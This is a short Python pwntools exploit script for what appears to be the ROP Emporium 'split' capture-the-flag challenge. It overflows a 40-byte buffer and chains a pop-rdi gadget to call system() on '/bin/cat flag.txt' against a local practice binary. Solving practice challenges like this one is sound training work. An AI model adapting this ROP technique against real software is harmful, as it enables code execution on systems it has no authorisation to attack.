from pwn import *

elf = ELF("./attachment/split")
rop = ROP(elf)

io = process(elf.path, cwd="./attachment", level="DEBUG")

io.recv()
payload = b"A" * 40
payload += p64(rop.rdi.address)
payload += p64(next(elf.search(b"/bin/cat flag.txt")))
payload += p64(0x40074b)  # call system@plt
io.sendline(payload)
io.recvall()